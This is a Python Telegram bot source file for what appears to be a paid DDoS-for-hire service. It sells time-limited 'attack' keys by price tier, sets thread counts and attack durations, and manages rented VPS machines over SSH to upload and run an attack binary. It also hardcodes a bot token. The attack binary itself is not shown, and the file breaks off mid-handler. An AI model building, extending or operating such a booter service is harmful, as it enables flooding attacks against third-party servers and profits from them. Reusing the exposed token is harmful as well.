import telebot
import datetime
import time
import subprocess
import random
import threading
import os
import ipaddress
import psutil
import paramiko
from scp import SCPClient
import json
import uuid
import sqlite3
from time import sleep

# ======================
# üõ†Ô∏è BOT CONFIGURATION
# ======================
TOKEN = '7140094105:AAGOdS2nbsUi9fgyR6-mO5fib7rLOhH7erg'
OWNER_USERNAME = "GODxAloneBOY"
ADMIN_IDS = ["GODxAloneBOY", "RAJOWNER90"]  # Add admin usernames here
ALLOWED_GROUP_IDS = [-1002658128612]
MAX_THREADS = 900
SPECIAL_MAX_THREADS = 900
VIP_MAX_THREADS = 1500
MAX_DURATION = 240
SPECIAL_MAX_DURATION = 200
VIP_MAX_DURATION = 300
ACTIVE_VPS_COUNT = 4
BINARY_PATH = "/home/master/freeroot/root/runner"
BINARY_NAME = "runner"
KEY_PRICES = {
    "10M": 5,
    "30M": 8,
    "2H": 12,
    "5H": 15,
    "1D": 20,
    "2D": 30,
    "1W": 100,
    "VIP1D": 50,
    "VIP2D": 80
}
REFERRAL_REWARD_DURATION = 120 # Hours of free attack for referrals
PUBLIC_GROUPS = []  # List of group IDs where public attacks are allowed

# ======================
# üì¶ DATA STORAGE
# ======================
keys = {}
special_keys = {}
vip_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
running_attacks = {}
reseller_balances = {}
instructor_notices = {}
VPS_LIST = []
REFERRAL_CODES = {}
REFERRAL_LINKS = {}
GROUP_SETTINGS = {}
last_attack_time = 0
global_cooldown = 60
# Add to DATA STORAGE section
all_users = {}  # To store all users who interact with the bot
bot_open = False

# ======================
# ü§ñ BOT INITIALIZATION
# ======================
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=10)

# ======================
# üîí SECURE SSH CONFIGURATION
# ======================

SSH_CONFIG = {
    'timeout': 15,
    'banner_timeout': 20,
    'auth_timeout': 20,
    'look_for_keys': False,
    'allow_agent': False,
    'keepalive_interval': 15  # ADD THIS LINE
}

# ======================
# üîß HELPER FUNCTIONS
# ======================

def create_progress_bar(percentage):
    """Create a visual progress bar"""
    bars = "‚ñ∞" * int(percentage/10)
    empty = "‚ñ±" * (10 - len(bars))
    return f"[{bars}{empty}] {percentage}%"

def check_vps_health(vps):
    """Comprehensive VPS health check"""
    health = {
        'ip': vps[0],
        'status': 'offline',
        'load': None,
        'memory': None,
        'disk': None,
        'network': False,
        'binary': False
    }
    
    ssh = None
    try:
        ssh = create_ssh_client(vps[0], vps[1], vps[2])
        health['status'] = 'online'
        
        stdin, stdout, stderr = ssh.exec_command('cat /proc/loadavg')
        health['load'] = stdout.read().decode().split()[0]
        
        stdin, stdout, stderr = ssh.exec_command('free -m | awk \'NR==2{printf "%.1f%%", $3*100/$2 }\'')
        health['memory'] = stdout.read().decode().strip()
        
        stdin, stdout, stderr = ssh.exec_command('df -h | awk \'$NF=="/"{printf "%s", $5}\'')
        health['disk'] = stdout.read().decode().strip()
        
        stdin, stdout, stderr = ssh.exec_command('ping -c 1 google.com >/dev/null 2>&1 && echo "online" || echo "offline"')
        health['network'] = 'online' in stdout.read().decode()
        
        stdin, stdout, stderr = ssh.exec_command(f'test -x {BINARY_PATH} && echo "exists" || echo "missing"')
        health['binary'] = 'exists' in stdout.read().decode()
        
    except Exception as e:
        health['error'] = str(e)
    finally:
        if ssh:
            ssh.close()
    
    return health

def show_vps_status(message):
    """Show detailed VPS status"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî Only owner can check VPS status!")
        return
    
    msg = bot.send_message(message.chat.id, "üîÑ Checking VPS status...")
    
    status_messages = []
    for i, vps in enumerate(VPS_LIST):
        health = check_vps_health(vps)
        
        status_msg = f"""
üîπ VPS {i+1} - {vps[0]}
‚îú Status: {'üü¢ Online' if health['status'] == 'online' else 'üî¥ Offline'}
‚îú Load: {health.get('load', 'N/A')}
‚îú Memory: {health.get('memory', 'N/A')}
‚îú Disk: {health.get('disk', 'N/A')}
‚îú Network: {'‚úÖ' if health.get('network') else '‚ùå'}
‚îî Binary: {'‚úÖ' if health.get('binary') else '‚ùå'}
"""
        if 'error' in health:
            status_msg += f"‚îî Error: {health['error']}\n"
        
        status_messages.append(status_msg)
    
    full_message = "üìä VPS STATUS REPORT\n\n" + "\n".join(status_messages)
    
    try:
        bot.edit_message_text(full_message, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, full_message)
        
def get_vps_load(vps):
    """Get current load of a VPS"""
    try:
        ssh = create_ssh_client(vps[0], vps[1], vps[2])
        stdin, stdout, stderr = ssh.exec_command('cat /proc/loadavg')
        load = stdout.read().decode().split()[0]
        ssh.close()
        return float(load)
    except:
        return float('inf')

def select_optimal_vps(vps_list, required_threads):
    """Select best VPS based on current load"""
    available_vps = []
    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for vps in vps_list:
        # Skip invalid VPS configurations
        if len(vps) < 3:
            continue
            
        if vps[0] not in busy_vps:
            try:
                load = get_vps_load(vps)
                available_vps.append((vps, load))
            except:
                continue
    
    if not available_vps:
        return []
    
    available_vps.sort(key=lambda x: x[1])
    base_threads = required_threads // len(available_vps)
    vps_distribution = []
    
    for vps, load in available_vps:
        threads = base_threads
        vps_distribution.append((vps, threads))
        required_threads -= threads
    
    i = 0
    while required_threads > 0:
        vps_distribution[i] = (vps_distribution[i][0], vps_distribution[i][1] + 1)
        required_threads -= 1
        i = (i + 1) % len(vps_distribution)
    
    return vps_distribution
            
def handle_notice_confirmation(call):
    # ... existing code ...
    
    # Send to all users who ever interacted
    for uid in all_users:
        send_notice(uid)
        time.sleep(0.1)
    
def is_allowed_group(message):
    return message.chat.id in ALLOWED_GROUP_IDS or message.chat.type == "private"

def is_owner(user):
    return user.username == OWNER_USERNAME

def is_admin(user):
    return user.username in ADMIN_IDS or is_owner(user)

def is_authorized_user(user):
    user_id = str(user.id)
    
    # Check if user is banned
    if 'banned_users' in globals() and user_id in banned_users:
        return False
        
    # Check if admin
    if is_admin(user):
        return True
        
    # Check if user has a valid key
    if user_id in redeemed_users:
        user_data = redeemed_users[user_id]
        # Handle both old format (just expiration_time) and new format (dictionary)
        if isinstance(user_data, dict):
            expiration_time = user_data.get('expiration_time', 0)
        else:
            expiration_time = user_data  # old format where value was just expiration_time
            
        if time.time() < expiration_time:
            return True
        else:
            # Remove expired user
            del redeemed_users[user_id]
            save_data()
            
    return False

def cleanup_expired_users():
    current_time = time.time()
    expired_users = []
    
    for user_id, user_data in redeemed_users.items():
        if isinstance(user_data, dict):
            expiration_time = user_data.get('expiration_time', 0)
        else:
            expiration_time = user_data
            
        if current_time > expiration_time:
            expired_users.append(user_id)
    
    for user_id in expired_users:
        del redeemed_users[user_id]
    
    if expired_users:
        save_data()
        
def get_display_name(user):
    return f"@{user.username}" if user.username else user.first_name

def save_data():
    """Save all bot data to JSON files"""
    with open('keys.json', 'w') as f:
        json.dump({
            'all_users': all_users,
            'keys': keys,
            'special_keys': special_keys,
            'vip_keys': vip_keys,
            'redeemed_users': redeemed_users,
            'redeemed_keys_info': redeemed_keys_info,
            'referral_codes': REFERRAL_CODES,
            'referral_links': REFERRAL_LINKS,
            'group_settings': GROUP_SETTINGS,
            'public_groups': PUBLIC_GROUPS,  # Add to save_data()
            'banned_users': banned_users if 'banned_users' in globals() else {},
            'vps_list': VPS_LIST,  # Add this line
            'thread_settings': {
                'MAX_THREADS': MAX_THREADS,
                'SPECIAL_MAX_THREADS': SPECIAL_MAX_THREADS,
                'VIP_MAX_THREADS': VIP_MAX_THREADS,
                'MAX_DURATION': MAX_DURATION,
                'SPECIAL_MAX_DURATION': SPECIAL_MAX_DURATION,
                'VIP_MAX_DURATION': VIP_MAX_DURATION
                
            }
        }, f)
    # ... rest of the function ...

def load_data():
    """Load all bot data from JSON files"""
    global keys, special_keys, vip_keys, redeemed_users, redeemed_keys_info, VPS_LIST, REFERRAL_CODES, REFERRAL_LINKS, GROUP_SETTINGS
    global MAX_THREADS, SPECIAL_MAX_THREADS, VIP_MAX_THREADS, MAX_DURATION, SPECIAL_MAX_DURATION, VIP_MAX_DURATION
    global all_users

    if os.path.exists('keys.json'):
        with open('keys.json', 'r') as f:
            data = json.load(f)
            keys = data.get('keys', {})
            special_keys = data.get('special_keys', {})
            vip_keys = data.get('vip_keys', {})
            redeemed_users = data.get('redeemed_users', {})
            redeemed_keys_info = data.get('redeemed_keys_info', {})
            REFERRAL_CODES = data.get('referral_codes', {})
            REFERRAL_LINKS = data.get('referral_links', {})
            GROUP_SETTINGS = data.get('group_settings', {})
            all_users = data.get('all_users', {})
            VPS_LIST = data.get('vps_list', [])  # Add this line
            PUBLIC_GROUPS = data.get('public_groups', [])  # Add to load_data()
            banned_users = data.get('banned_users', {})
            
            # Load thread settings
            thread_settings = data.get('thread_settings', {})
            MAX_THREADS = thread_settings.get('MAX_THREADS', 500)
            SPECIAL_MAX_THREADS = thread_settings.get('SPECIAL_MAX_THREADS', 900)
            VIP_MAX_THREADS = thread_settings.get('VIP_MAX_THREADS', 1500)
            MAX_DURATION = thread_settings.get('MAX_DURATION', 240)
            SPECIAL_MAX_DURATION = thread_settings.get('SPECIAL_MAX_DURATION', 200)
            VIP_MAX_DURATION = thread_settings.get('VIP_MAX_DURATION', 300)

def save_admins():
    """Save admin list to file"""
    with open('admins.json', 'w') as f:
        json.dump(ADMIN_IDS, f)

def load_admins():
    """Load admin list from file"""
    global ADMIN_IDS
    if os.path.exists('admins.json'):
        with open('admins.json', 'r') as f:
            ADMIN_IDS = json.load(f)

def create_ssh_client(ip, username, password):
    """Create a secure SSH client with proper configuration"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
    ssh.load_system_host_keys()
    
    try:
        ssh.connect(
            hostname=ip,
            username=username,
            password=password,
            **SSH_CONFIG
        )
        transport = ssh.get_transport()
        transport.set_keepalive(SSH_CONFIG['keepalive_interval'])
        return ssh
    except Exception as e:
        raise Exception(f"SSH Connection failed: {str(e)}")

def secure_scp_transfer(ssh, local_path, remote_path):
    """Secure file transfer with SCP"""
    try:
        with SCPClient(ssh.get_transport(), socket_timeout=30) as scp:
            scp.put(local_path, remote_path)
        return True
    except Exception as e:
        raise Exception(f"SCP Transfer failed: {str(e)}")
        
# ======================
# ‚å®Ô∏è KEYBOARD MARKUPS (STYLISH VERSION)
# ======================
def create_main_keyboard(message=None):
    """Create main menu keyboard with stylish fonts"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)

    # Common buttons
    buttons = [
        telebot.types.KeyboardButton("üöÄ ùòºùôèùôèùòºùòæùôÜ ùôáùòºùôêùôâùòæùôÉ"),
        telebot.types.KeyboardButton("üîë ùôçùôÄùòøùôÄùôÄùôà ùôÜùôÄùôî"),
        telebot.types.KeyboardButton("üéÅ ùó•ùóòùóôùóôùóòùó•ùóîùóü"),
        telebot.types.KeyboardButton("üçÖ ùôãùôçùôäùôìùôî ùôéùôèùòºùôèùôêùôé"),
        telebot.types.KeyboardButton("üõë ùôéùôèùôäùôã ùòºùôèùôèùòºùòæùôÜ")
    ]

    user_id = str(message.from_user.id) if message else None
    if user_id in redeemed_users and isinstance(redeemed_users[user_id], dict):
        if redeemed_users[user_id].get('is_vip'):
            buttons.insert(1, telebot.types.KeyboardButton("üî• ùôëùôÑùôã ùòºùôèùôèùòºùòæùôÜ"))

    markup.add(*buttons)

    if message:
        if is_owner(message.from_user):
            admin_buttons = [
                telebot.types.KeyboardButton("üîê ùôÜùôÄùôî ùôàùòºùôâùòºùôÇùôÄùôç"),
                telebot.types.KeyboardButton("üñ•Ô∏è ùôëùôãùôé ùôàùòºùôâùòºùôÇùôÄùôç"),
                telebot.types.KeyboardButton("‚öôÔ∏è ùôèùôÉùôçùôÄùòºùòø ùôéùôÄùôèùôèùôÑùôâùôÇùôé"),
                telebot.types.KeyboardButton("üë• ùôÇùôçùôäùôêùôã ùôàùòºùôâùòºùôÇùôÄùôç"),
                telebot.types.KeyboardButton("üì¢ ùòΩùôçùôäùòøùòæùòºùôéùôè"),
                telebot.types.KeyboardButton("üñºÔ∏è ùôéùôÄùôè ùôéùôèùòºùôçùôè ùôÑùôàùòºùôÇùôÄ"),
                telebot.types.KeyboardButton("üìù ùôéùôÄùôè ùôäùôíùôâùôÄùôç ùôâùòºùôàùôÄ")
            ]
            markup.add(*admin_buttons)
        elif is_admin(message.from_user):
            limited_buttons = [
                telebot.types.KeyboardButton("üîê ùôÜùôÄùôî ùôàùòºùôâùòºùôÇùôÄùôç"),
                telebot.types.KeyboardButton("üë• ùôÇùôçùôäùôêùôã ùôàùòºùôâùòºùôÇùôÄùôç"),
                telebot.types.KeyboardButton("üñºÔ∏è ùôéùôÄùôè ùôéùôèùòºùôçùôè ùôÑùôàùòºùôÇùôÄ"),
                telebot.types.KeyboardButton("üìù ùôéùôÄùôè ùôäùôíùôâùôÄùôç ùôâùòºùôàùôÄ")
            ]
            markup.add(*limited_buttons)

    return markup

def create_key_management_keyboard():
    """Create stylish keyboard for key management"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("üîì ùôÇùôÄùôâùôçùòºùôèùôÄ ùôÜùôÄùôî"),
        telebot.types.KeyboardButton("üìã ùôÜùôÄùôî ùôáùôÑùôéùôè"),
        telebot.types.KeyboardButton("üóëÔ∏è ùòøùôÄùôáùôÄùôèùôÄ ùôÜùôÄùôî"),
        telebot.types.KeyboardButton("üîô ùôàùòºùôÑùôâ ùôàùôÄùôâùôê")
    ]
    markup.add(*buttons)
    return markup
    
def create_vip_keyboard():
    """Create VIP menu keyboard with premium styling"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("üî• ùôëùôÑùôã ùòºùôèùôèùòºùòæùôÜ"),
        telebot.types.KeyboardButton("üîë ùôçùôÄùòøùôÄùôÄùôà ùôÜùôÄùôî"),
        telebot.types.KeyboardButton("üçÖ ùòºùôèùôèùòºùòæùôÜ ùôéùôèùòºùôèùôêùôé"),
        telebot.types.KeyboardButton("üéÅ ùóöùóòùó°ùóòùó•ùóîùóßùóò ùó•ùóòùóôùóôùóòùó•ùóîùóü"),
        telebot.types.KeyboardButton("üçÅ ùôëùôÑùôã ùôÅùôêùôâùòæùôèùôÑùôäùôâ")
    ]
    markup.add(*buttons)
    return markup    

def create_vps_management_keyboard():
    """Create VPS management keyboard with tech style"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("üñ•Ô∏è ùôëùôãùôé ùôéùôèùòºùôèùôêùôé"),
        telebot.types.KeyboardButton("üè• ùôëùôãùôé ùôÉùôÄùòºùôáùôèùôÉ"),
        telebot.types.KeyboardButton("‚ö° ùòΩùôäùôäùôéùôè ùôëùôãùôé (ùôéùòºùôÅùôÄ)"),
        telebot.types.KeyboardButton("‚ûï ùòºùòøùòø ùôëùôãùôé"),
        telebot.types.KeyboardButton("‚ûñ ùôçùôÄùôàùôäùôëùôÄ ùôëùôãùôé"),
        telebot.types.KeyboardButton("üì§ ùôêùôãùôáùôäùòºùòø ùòΩùôÑùôâùòºùôçùôî"),
        telebot.types.KeyboardButton("üóëÔ∏è ùòøùôÄùôáùôÄùôèùôÄ ùòΩùôÑùôâùòºùôçùôî"),
        telebot.types.KeyboardButton("üîô ùôàùòºùôÑùôâ ùôàùôÄùôâùôê")
    ]
    markup.add(*buttons)
    return markup

def create_group_management_keyboard():
    """Create stylish group management keyboard"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("‚ûï ùòºùòøùòø ùòºùòøùôàùôÑùôâ"),
        telebot.types.KeyboardButton("‚ûñ ùôçùôÄùôàùôäùôëùôÄ ùòºùòøùôàùôÑùôâ"),
        telebot.types.KeyboardButton("üìã ùóîùóóùó†ùóúùó° ùóüùóúùó¶ùóß"),
        telebot.types.KeyboardButton("üåê ùòºùòæùôèùôÑùôëùòºùôèùôÄ ùôãùôêùòΩùôáùôÑùòæ"),
        telebot.types.KeyboardButton("‚ùå ùòøùôÄùòºùòæùôèùôÑùôëùòºùôèùôÄ ùôãùôêùòΩùôáùôÑùòæ"),
        telebot.types.KeyboardButton("üë• ùòºùòøùòø ùôÇùôçùôäùôêùôã"),
        telebot.types.KeyboardButton("üë• ùôçùôÄùôàùôäùôëùôÄ ùôÇùôçùôäùôêùôã"),
        telebot.types.KeyboardButton("üî® ùòΩùòºùôâ ùôêùôéùôÄùôç"),
        telebot.types.KeyboardButton("üòÖ ùóîùóüùóü ùôêùôéùôÄùôçùôé"),
        telebot.types.KeyboardButton("üîì ùôêùôâùòΩùòºùôâ ùôêùôéùôÄùôç"),  # Added unban button
        telebot.types.KeyboardButton("üîô ùôàùòºùôÑùôâ ùôàùôÄùôâùôê")
    ]
    markup.add(*buttons)
    return markup

# Option 1: Update the keyboard creation function (recommended)
def create_thread_settings_keyboard():
    """Create keyboard for thread settings management"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("üßµ SET NORMAL THREADS"),
        telebot.types.KeyboardButton("‚ö° SET SPECIAL THREADS"),
        telebot.types.KeyboardButton("üíé SET VIP THREADS"),
        telebot.types.KeyboardButton("üìä VIEW THREAD SETTINGS"),
        telebot.types.KeyboardButton("üîô ùôàùòºùôÑùôâ ùôàùôÄùôâùôê")  # Changed to match the handler
    ]
    markup.add(*buttons)
    return markup

# OR Option 2: Add an additional handler (alternative solution)
@bot.message_handler(func=lambda msg: msg.text in ["üîô ùôàùòºùôÑùôâ ùôàùôÄùôâùôê", "‚¨ÖÔ∏è ùóïùóÆùó∞ùó∏", "MAIN MENU"])  # Added "MAIN MENU"
def back_to_main_menu(message):
    """Return user to main menu with stylish message"""
    bot.send_message(
        message.chat.id, 
        "üè† ùó•ùó≤ùòÅùòÇùóøùóªùó∂ùóªùó¥ ùòÅùóº ùó∫ùóÆùó∂ùóª ùó∫ùó≤ùóªùòÇ...",
        reply_markup=create_main_keyboard(message)
    )

# ======================
# üîô BACK TO MAIN MENU
# ======================    
@bot.message_handler(func=lambda msg: msg.text in ["üîô ùôàùòºùôÑùôâ ùôàùôÄùôâùôê", "‚¨ÖÔ∏è ùóïùóÆùó∞ùó∏"])
def back_to_main_menu(message):
    """Return user to main menu with stylish message"""
    bot.send_message(
        message.chat.id, 
        "üè† ùó•ùó≤ùòÅùòÇùóøùóªùó∂ùóªùó¥ ùòÅùóº ùó∫ùóÆùó∂ùóª ùó∫ùó≤ùóªùòÇ...",
        reply_markup=create_main_keyboard(message)
    )    

# ======================
# üîê ADMIN MENU HANDLERS (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "üîê ùôÜùôÄùôî ùôàùòºùôâùòºùôÇùôÄùôç")
def key_management_menu(message):
    """Handle key management menu access with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "‚õî ùóîùó∞ùó∞ùó≤ùòÄùòÄ ùó±ùó≤ùóªùó∂ùó≤ùó±!")
        return
    bot.send_message(
        message.chat.id,
        "üîë ùóûùó≤ùòÜ ùó†ùóÆùóªùóÆùó¥ùó≤ùó∫ùó≤ùóªùòÅ ùó£ùóÆùóªùó≤ùóπ - ùó¶ùó≤ùóπùó≤ùó∞ùòÅ ùóÆùóª ùóºùóΩùòÅùó∂ùóºùóª:",
        reply_markup=create_key_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "üë• ùôÇùôçùôäùôêùôã ùôàùòºùôâùòºùôÇùôÄùôç")
def group_management_menu(message):
    """Handle group management menu access with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "‚õî ùóîùó∞ùó∞ùó≤ùòÄùòÄ ùó±ùó≤ùóªùó∂ùó≤ùó±!")
        return
    bot.send_message(
        message.chat.id,
        "üë• ùóöùóøùóºùòÇùóΩ ùó†ùóÆùóªùóÆùó¥ùó≤ùó∫ùó≤ùóªùòÅ ùó£ùóÆùóªùó≤ùóπ - ùó¶ùó≤ùóπùó≤ùó∞ùòÅ ùóÆùóª ùóºùóΩùòÅùó∂ùóºùóª:",
        reply_markup=create_group_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "üñ•Ô∏è ùôëùôãùôé ùôàùòºùôâùòºùôÇùôÄùôç")
def vps_management_menu(message):
    """Handle VPS management menu access with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî ùóîùó∞ùó∞ùó≤ùòÄùòÄ ùó±ùó≤ùóªùó∂ùó≤ùó±!")
        return
    bot.send_message(
        message.chat.id, 
        "üñ•Ô∏è ùó©ùó£ùó¶ ùó†ùóÆùóªùóÆùó¥ùó≤ùó∫ùó≤ùóªùòÅ ùó£ùóÆùóªùó≤ùóπ - ùó¶ùó≤ùóπùó≤ùó∞ùòÅ ùóÆùóª ùóºùóΩùòÅùó∂ùóºùóª:",
        reply_markup=create_vps_management_keyboard()
    )

# ======================
# üñºÔ∏è GROUP SETTINGS (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "üñºÔ∏è ùôéùôÄùôè ùôéùôèùòºùôçùôè ùôÑùôàùòºùôÇùôÄ")
def set_start_image(message):
    """Set start image for a group with stylish interface"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "‚õî ùó¢ùóªùóπùòÜ ùóÆùó±ùó∫ùó∂ùóªùòÄ ùó∞ùóÆùóª ùòÄùó≤ùòÅ ùòÅùóµùó≤ ùòÄùòÅùóÆùóøùòÅ ùó∂ùó∫ùóÆùó¥ùó≤!")
        return
        
    # Create keyboard with allowed groups
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"üñºÔ∏è {chat.title}"))
        except:
            continue
    markup.add(telebot.types.KeyboardButton("‚ùå ùóñùóÆùóªùó∞ùó≤ùóπ"))
    
    bot.reply_to(message, "ùó¶ùó≤ùóπùó≤ùó∞ùòÅ ùóÆ ùó¥ùóøùóºùòÇùóΩ ùòÅùóº ùòÄùó≤ùòÅ ùòÄùòÅùóÆùóøùòÅ ùó∂ùó∫ùóÆùó¥ùó≤ ùó≥ùóºùóø:", reply_markup=markup)
    bot.register_next_step_handler(message, process_group_for_image)

def process_group_for_image(message):
    """Process group selection for image setting with stylish interface"""
    if message.text == "‚ùå ùóñùóÆùóªùó∞ùó≤ùóπ":
        bot.reply_to(message, "ùóúùó∫ùóÆùó¥ùó≤ ùòÄùó≤ùòÅùòÅùó∂ùóªùó¥ ùó∞ùóÆùóªùó∞ùó≤ùóπùóπùó≤ùó±.", reply_markup=create_main_keyboard(message))
        return

    selected_title = message.text[2:].strip().lower()  # Remove prefix & normalize
    selected_group = None

    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if selected_title in chat.title.strip().lower():  # Partial and case-insensitive match
                selected_group = group_id
                break
        except Exception as e:
            print(f"[ERROR] Could not get chat info for group {group_id}: {e}")

    if not selected_group:
        bot.reply_to(message, "‚ùå ùóöùóøùóºùòÇùóΩ ùóªùóºùòÅ ùó≥ùóºùòÇùóªùó±!", reply_markup=create_main_keyboard(message))
        return

    bot.reply_to(message, "üì∑ ùó£ùóπùó≤ùóÆùòÄùó≤ ùòÄùó≤ùóªùó± ùòÅùóµùó≤ ùó∂ùó∫ùóÆùó¥ùó≤ ùòÜùóºùòÇ ùòÑùóÆùóªùòÅ ùòÅùóº ùòÄùó≤ùòÅ ùóÆùòÄ ùòÅùóµùó≤ ùòÄùòÅùóÆùóøùòÅ ùó∫ùó≤ùòÄùòÄùóÆùó¥ùó≤ ùó∂ùó∫ùóÆùó¥ùó≤:")
    bot.register_next_step_handler(message, lambda msg: process_start_image(msg, selected_group))

def process_start_image(message, group_id):
    """Process the image and save it for the group with stylish confirmation"""
    if not message.photo:
        bot.reply_to(message, "‚ùå ùóßùóµùóÆùòÅ'ùòÄ ùóªùóºùòÅ ùóÆùóª ùó∂ùó∫ùóÆùó¥ùó≤! ùó£ùóπùó≤ùóÆùòÄùó≤ ùòÅùóøùòÜ ùóÆùó¥ùóÆùó∂ùóª.")
        return
        
    # Initialize group settings if not exists
    if str(group_id) not in GROUP_SETTINGS:
        GROUP_SETTINGS[str(group_id)] = {}
        
    # Get the highest resolution photo
    GROUP_SETTINGS[str(group_id)]['start_image'] = message.photo[-1].file_id
    save_data()
    
    try:
        chat = bot.get_chat(group_id)
        bot.reply_to(message, f"‚úÖ ùó¶ùòÅùóÆùóøùòÅ ùó∂ùó∫ùóÆùó¥ùó≤ ùòÄùó≤ùòÅ ùòÄùòÇùó∞ùó∞ùó≤ùòÄùòÄùó≥ùòÇùóπùóπùòÜ ùó≥ùóºùóø ùó¥ùóøùóºùòÇùóΩ: {chat.title}")
    except:
        bot.reply_to(message, "‚úÖ ùó¶ùòÅùóÆùóøùòÅ ùó∂ùó∫ùóÆùó¥ùó≤ ùòÄùó≤ùòÅ ùòÄùòÇùó∞ùó∞ùó≤ùòÄùòÄùó≥ùòÇùóπùóπùòÜ!")

@bot.message_handler(func=lambda msg: msg.text == "üìù ùôéùôÄùôè ùôäùôíùôâùôÄùôç ùôâùòºùôàùôÄ")
def set_owner_name(message):
    """Set owner name for a group with stylish interface"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "‚õî ùó¢ùóªùóπùòÜ ùóÆùó±ùó∫ùó∂ùóªùòÄ ùó∞ùóÆùóª ùòÄùó≤ùòÅ ùòÅùóµùó≤ ùóºùòÑùóªùó≤ùóø ùóªùóÆùó∫ùó≤!")
        return
        
    # Create keyboard with allowed groups
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"üëë {chat.title}"))
        except:
            continue
    markup.add(telebot.types.KeyboardButton("‚ùå ùóñùóÆùóªùó∞ùó≤ùóπ"))
    
    bot.reply_to(message, "ùó¶ùó≤ùóπùó≤ùó∞ùòÅ ùóÆ ùó¥ùóøùóºùòÇùóΩ ùòÅùóº ùòÄùó≤ùòÅ ùóºùòÑùóªùó≤ùóø ùóªùóÆùó∫ùó≤ ùó≥ùóºùóø:", reply_markup=markup)
    bot.register_next_step_handler(message, process_group_for_owner_name)

def process_group_for_owner_name(message):
    """Process group selection for owner name setting with stylish interface"""
    if message.text == "‚ùå ùóñùóÆùóªùó∞ùó≤ùóπ":
        bot.reply_to(message, "ùó¢ùòÑùóªùó≤ùóø ùóªùóÆùó∫ùó≤ ùòÄùó≤ùòÅùòÅùó∂ùóªùó¥ ùó∞ùóÆùóªùó∞ùó≤ùóπùóπùó≤ùó±.", reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the üëë prefix
    selected_group = None
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            continue
    
    if not selected_group:
        bot.reply_to(message, "‚ùå ùóöùóøùóºùòÇùóΩ ùóªùóºùòÅ ùó≥ùóºùòÇùóªùó±!", reply_markup=create_main_keyboard(message))
        return
    
    bot.reply_to(message, "üìù ùó£ùóπùó≤ùóÆùòÄùó≤ ùó≤ùóªùòÅùó≤ùóø ùòÅùóµùó≤ ùóªùó≤ùòÑ ùóºùòÑùóªùó≤ùóø ùóªùóÆùó∫ùó≤ ùó≥ùóºùóø ùòÅùóµùó∂ùòÄ ùó¥ùóøùóºùòÇùóΩ:")
    bot.register_next_step_handler(message, lambda msg: process_owner_name(msg, selected_group))

def process_owner_name(message, group_id):
    """Process and save the new owner name with stylish confirmation"""
    if not message.text or len(message.text) > 32:
        bot.reply_to(message, "‚ùå ùóúùóªùòÉùóÆùóπùó∂ùó± ùóªùóÆùó∫ùó≤! ùó†ùòÇùòÄùòÅ ùóØùó≤ ùü≠-ùüØùüÆ ùó∞ùóµùóÆùóøùóÆùó∞ùòÅùó≤ùóøùòÄ.")
        return
        
    # Initialize group settings if not exists
    if str(group_id) not in GROUP_SETTINGS:
        GROUP_SETTINGS[str(group_id)] = {}
        
    GROUP_SETTINGS[str(group_id)]['owner_name'] = message.text
    save_data()
    
    try:
        chat = bot.get_chat(group_id)
        bot.reply_to(message, f"‚úÖ ùó¢ùòÑùóªùó≤ùóø ùóªùóÆùó∫ùó≤ ùòÄùó≤ùòÅ ùòÅùóº: {message.text} ùó≥ùóºùóø ùó¥ùóøùóºùòÇùóΩ: {chat.title}")
    except:
        bot.reply_to(message, f"‚úÖ ùó¢ùòÑùóªùó≤ùóø ùóªùóÆùó∫ùó≤ ùòÄùó≤ùòÅ ùòÅùóº: {message.text}")

# ======================
# üè† WELCOME MESSAGE (STYLISH VERSION)
# ======================
@bot.message_handler(commands=['start'])
def welcome(message):
    """Handle /start command with premium styling and user tracking"""
    # Track all users who interact with the bot
    user_id = str(message.from_user.id)
    user = message.from_user
    
    # Initialize all_users dictionary if not exists
    if 'all_users' not in globals():
        global all_users
        all_users = {}
    
    # Add/update user in tracking
    all_users[user_id] = {
        'first_seen': time.time(),
        'username': user.username,
        'first_name': user.first_name,
        'last_name': user.last_name if user.last_name else "",
        'last_active': time.time(),
        'is_admin': is_admin(user),
        'is_owner': is_owner(user),
        'has_key': user_id in redeemed_users
    }
    save_data()  # Save the updated user data
    
    # Check for referral code
    if len(message.text.split()) > 1:
        referral_code = message.text.split()[1]
        handle_referral(message, referral_code)
    
